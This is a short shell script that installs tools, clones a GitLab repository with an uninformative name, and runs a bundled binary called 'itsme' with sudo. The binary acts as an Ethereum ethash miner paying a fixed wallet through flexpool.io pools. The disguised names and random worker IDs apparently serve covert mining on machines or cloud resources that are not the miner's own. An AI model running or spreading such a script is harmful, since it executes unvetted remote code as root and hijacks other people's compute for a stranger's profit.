#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS sahuman.sh 65 75
sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
cd sainame127
chmod +x itsme
sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hk.flexpool.io -r $(echo $(shuf -i 19141-34464563 -n 1))  --nvidia 1
